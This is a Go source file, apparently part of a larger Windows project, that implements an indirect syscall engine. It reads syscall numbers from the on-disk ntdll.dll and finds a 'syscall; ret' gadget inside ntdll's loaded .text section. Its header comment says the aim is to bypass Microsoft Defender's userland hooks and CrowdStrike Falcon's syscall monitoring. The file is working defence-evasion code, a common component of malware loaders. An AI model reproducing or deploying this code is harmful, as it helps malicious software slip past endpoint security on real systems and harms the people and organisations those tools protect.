//go:build windows

// Indirect syscall engine — resolves syscall numbers from clean ntdll on disk
// and executes syscall instructions from within ntdll's .text section.
// This bypasses both Defender's userland hooks AND CrowdStrike Falcon's
// syscall monitoring (which flags syscall instructions outside ntdll's range).
package main

import (
	"encoding/binary"
	"os"
	"runtime"
	"sort"
	"strings"
	"syscall"
	"unsafe"
)

type syscallEntry struct {
	Name    string
	Number  uint16
	Address uintptr // address of "syscall; ret" gadget in ntdll .text
}

var (
	syscallTable    map[string]syscallEntry
	syscallGadget   uintptr // address of a "syscall; ret" instruction in ntdll
	ntdllTextBase   uintptr
	ntdllTextSize   uintptr
)

// initSyscallTable builds the syscall number table by parsing ntdll exports
// from the clean on-disk copy, then finds a syscall;ret gadget in the
// loaded ntdll .text section for indirect execution.
func initSyscallTable() {
	syscallTable = make(map[string]syscallEntry)

	sysroot := os.Getenv("SYSTEMROOT")
	if sysroot == "" {
		sysroot = `C:\Windows`
	}

	var ntdllPath string
	if runtime.GOARCH == "amd64" {
		ntdllPath = sysroot + `\System32\ntdll.dll`
	} else {
		ntdllPath = sysroot + `\SysWOW64\ntdll.dll`
	}

	data, err := os.ReadFile(ntdllPath)
	if err != nil {
		return
	}

	// Parse PE exports to find Zw* functions and extract syscall numbers
	entries := parseNtdllExports(data)
	for _, e := range entries {
		syscallTable[e.Name] = e
	}

	// Find syscall;ret gadget in loaded ntdll .text section
	findSyscallGadget()
}

// parseNtdllExports reads the PE export directory and extracts syscall numbers
// from Zw* stubs. On x64, the pattern is: mov r10, rcx; mov eax, <SSN>
func parseNtdllExports(pe []byte) []syscallEntry {
	if len(pe) < 64 {
		return nil
	}
	dosHdr := binary.LittleEndian.Uint32(pe[60:64])
	if int(dosHdr)+24+96 > len(pe) {
		return nil
	}

	ntHdr := dosHdr
	magic := binary.LittleEndian.Uint16(pe[ntHdr+24 : ntHdr+26])

	var exportRVA, exportSize uint32
	switch magic {
	case 0x20B: // PE32+
		exportRVA = binary.LittleEndian.Uint32(pe[ntHdr+24+112 : ntHdr+24+116])
		exportSize = binary.LittleEndian.Uint32(pe[ntHdr+24+116 : ntHdr+24+120])
	case 0x10B: // PE32
		exportRVA = binary.LittleEndian.Uint32(pe[ntHdr+24+96 : ntHdr+24+100])
		exportSize = binary.LittleEndian.Uint32(pe[ntHdr+24+100 : ntHdr+24+104])
	default:
		return nil
	}

	if exportRVA == 0 || exportSize == 0 {
		return nil
	}

	// Resolve RVA to file offset using section table
	numSections := binary.LittleEndian.Uint16(pe[ntHdr+6 : ntHdr+8])
	optHdrSize := binary.LittleEndian.Uint16(pe[ntHdr+20 : ntHdr+22])
	sectionStart := ntHdr + 24 + uint32(optHdrSize)

	rvaToOffset := func(rva uint32) uint32 {
		for i := uint16(0); i < numSections; i++ {
			off := sectionStart + uint32(i)*40
			if off+40 > uint32(len(pe)) {
				break
			}
			vaddr := binary.LittleEndian.Uint32(pe[off+12 : off+16])
			vsize := binary.LittleEndian.Uint32(pe[off+8 : off+12])
			rawOff := binary.LittleEndian.Uint32(pe[off+20 : off+24])
			if rva >= vaddr && rva < vaddr+vsize {
				return rawOff + (rva - vaddr)
			}
		}
		return 0
	}

	expOff := rvaToOffset(exportRVA)
	if expOff == 0 || int(expOff)+40 > len(pe) {
		return nil
	}

	numFuncs := binary.LittleEndian.Uint32(pe[expOff+20 : expOff+24])
	funcRVA := rvaToOffset(binary.LittleEndian.Uint32(pe[expOff+28 : expOff+32]))
	nameRVA := rvaToOffset(binary.LittleEndian.Uint32(pe[expOff+32 : expOff+36]))
	ordRVA := rvaToOffset(binary.LittleEndian.Uint32(pe[expOff+36 : expOff+40]))

	if funcRVA == 0 || nameRVA == 0 || ordRVA == 0 {
		return nil
	}

	type zwFunc struct {
		name    string
		funcRVA uint32
	}
	var zwFuncs []zwFunc

	for i := uint32(0); i < numFuncs; i++ {
		if int(nameRVA)+int(i)*4+4 > len(pe) || int(ordRVA)+int(i)*2+2 > len(pe) {
			break
		}
		namePtr := rvaToOffset(binary.LittleEndian.Uint32(pe[nameRVA+i*4 : nameRVA+i*4+4]))
		if namePtr == 0 || int(namePtr) >= len(pe) {
			continue
		}

		// Read null-terminated name
		end := namePtr
		for int(end) < len(pe) && pe[end] != 0 {
			end++
		}
		name := string(pe[namePtr:end])

		if !strings.HasPrefix(name, "Zw") {
			continue
		}

		ord := binary.LittleEndian.Uint16(pe[ordRVA+i*2 : ordRVA+i*2+2])
		if int(funcRVA)+int(ord)*4+4 > len(pe) {
			continue
		}
		fRVA := binary.LittleEndian.Uint32(pe[funcRVA+uint32(ord)*4 : funcRVA+uint32(ord)*4+4])
		zwFuncs = append(zwFuncs, zwFunc{name: name, funcRVA: fRVA})
	}

	// Sort by RVA — syscall numbers are assigned in this order
	sort.Slice(zwFuncs, func(i, j int) bool {
		return zwFuncs[i].funcRVA < zwFuncs[j].funcRVA
	})

	var entries []syscallEntry
	for i, zw := range zwFuncs {
		ntName := "Nt" + zw.name[2:]
		entries = append(entries, syscallEntry{
			Name:   ntName,
			Number: uint16(i),
		})
	}

	return entries
}

// findSyscallGadget locates a "syscall; ret" (0F 05 C3) gadget within
// ntdll's .text section. Indirect syscalls execute from this address
// so CrowdStrike sees the syscall originating from ntdll's address range.
func findSyscallGadget() {
	ntdllName, _ := syscall.UTF16PtrFromString("ntdll.dll")
	base, _, _ := pGetModuleHandle.Call(uintptr(unsafe.Pointer(ntdllName)))
	if base == 0 {
		return
	}

	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(base))
	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(base + uintptr(dosHeader.E_lfanew)))
	sectionOffset := uintptr(dosHeader.E_lfanew) + 24 + uintptr(ntHeaders.OptionalHeaderSize)

	for i := uint16(0); i < ntHeaders.NumberOfSections; i++ {
		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(base + sectionOffset + uintptr(i)*40))
		name := sectionName(section)
		if name != ".text" {
			continue
		}

		textBase := base + uintptr(section.VirtualAddress)
		textSize := uintptr(section.VirtualSize)
		ntdllTextBase = textBase
		ntdllTextSize = textSize

		// Scan for syscall; ret (0F 05 C3)
		text := unsafe.Slice((*byte)(unsafe.Pointer(textBase)), textSize)
		for j := uintptr(0); j < textSize-2; j++ {
			if text[j] == 0x0F && text[j+1] == 0x05 && text[j+2] == 0xC3 {
				syscallGadget = textBase + j
				return
			}
		}
		break
	}
}

// getSyscallNumber returns the SSN for a given Nt* function name.
func getSyscallNumber(name string) (uint16, bool) {
	e, ok := syscallTable[name]
	if !ok {
		return 0, false
	}
	return e.Number, true
}
